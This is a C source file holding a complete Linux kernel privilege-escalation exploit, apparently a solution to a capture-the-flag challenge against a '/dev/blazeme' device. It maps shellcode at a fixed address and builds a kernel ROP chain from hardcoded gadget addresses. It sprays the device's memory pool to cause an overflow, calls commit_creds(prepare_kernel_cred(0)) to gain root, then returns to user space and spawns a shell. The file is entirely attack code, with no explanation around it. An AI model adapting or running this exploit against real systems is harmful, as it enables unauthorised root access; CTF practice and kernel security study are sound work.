#include <fcntl.h>
#include <sys/ioctl.h>
#include <mtd/mtd-user.h>
#include <errno.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

struct  trap_frame64 {
    void*     rip;
    uint64_t  cs;
    uint64_t  rflags;
    void*     rsp;
    uint64_t  ss;
} __attribute__ (( packed ));

struct trap_frame64 tf;

void shell(){
    printf("HACKED!!!!!!\n");
    system("/bin/sh");
}

void  prepare_tf(void) {
    asm(
        "xor %eax, %eax;"
        "mov %cs, %ax;"
        "pushq %rax;   popq tf+8;"
        "pushfq;      popq tf+16;"
        "pushq %rsp; popq tf+24;"
        "mov %ss, %ax;"
        "pushq %rax;   popq tf+32;"
    );
    tf.rip = &shell;
    tf.rsp  -= 1024;   //  unused  part of  stack
}

#define KERNCALL __attribute__((regparm(3)))
typedef int KERNCALL (* commit_creds_t)(unsigned long cred);
typedef unsigned long KERNCALL (* prepare_kernel_cred_t)(unsigned long cred);
commit_creds_t commit_creds=0xffffffff81063960; // courtesy of kallsyms.
prepare_kernel_cred_t prepare_kernel_cred=0xffffffff81063b50;

void payload() {
   commit_creds(prepare_kernel_cred(0));
   asm("movq $tf, %rsp; swapgs; iretq;");
}

// mov rax, imm64; jmp rax
unsigned char shellcode[] = { 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 };

int main(int argc, char** argv) {
	uintptr_t ptr=0x00007fffffff0000;
	unsigned char*  buf=mmap(ptr, 0x1000, PROT_EXEC|PROT_READ|PROT_WRITE,MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,-1,0);
    if (buf != ptr) {
        printf("bad mmap %p\n", buf);
        return 1;
    }

    *(uintptr_t*)(shellcode+2) = &payload; // relocate jump dst
	memcpy(buf, shellcode, sizeof(shellcode));
	printf("shellcode at %p, jumping to %p\n",buf, *(uintptr_t*)(buf+2));

    char ropchain[64]="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    *(uintptr_t*)(ropchain+18)=0xffffffff810e14d6; // mov ecx, 0x10 ; mov rax, rcx ; ret
    *(uintptr_t*)(ropchain+26)=0xffffffff8127b8f9; // mov eax, 0x7fffffff ; pop rbp ; ret
    *(uintptr_t*)(ropchain+34)=0x1234123412341234; // popped rbp value
    *(uintptr_t*)(ropchain+42)=0xffffffff81102330; // shl rax, cl ; ret
    *(uintptr_t*)(ropchain+50)=0xFFFFFFFF8107BC1D; // call rax

    prepare_tf(); // this is a bit sloppy, but ok.
    printf("cs=%p ss=%p rip=%p rsp=%p rflags=%p\n", tf.cs, tf.ss, tf.rip, tf.rsp, tf.rflags);

    int fd = open("/dev/blazeme", O_WRONLY);
    if (fd < 0) {
        perror("open: ");
        return 1;
    }

    // spray the page pool.
    // eventually we will get reassigned the same block enough times to
    // fill it up completely with non-zero bytes ,leading to an overflow.
    for (int i = 0; i < 1000; i++) {
        if (write(fd, ropchain, 64) != 64) {
            perror("write: ");
            return 1;
        }
    }
    printf("exploit failed. try it again\n");
    close(fd);

	return 0;
}
